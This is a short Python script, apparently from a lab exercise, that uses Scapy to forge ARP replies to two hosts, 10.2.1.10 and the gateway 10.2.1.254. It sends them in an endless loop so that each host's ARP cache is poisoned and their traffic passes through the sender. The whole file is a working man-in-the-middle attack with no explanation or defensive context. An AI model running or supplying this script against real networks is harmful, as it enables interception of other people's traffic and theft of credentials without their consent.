from scapy.all import *

pk = Ether(dst="08:00:27:8d:55:5f")/ARP (pdst="10.2.1.10", psrc="10.2.1.254")
pk2 = Ether(dst="08:00:27:d9:f1:c8")/ARP (pdst="10.2.1.254", psrc="10.2.1.10")

while True:
	sendp(pk, iface="enp0s3")
	sendp(pk2, iface="enp0s3")
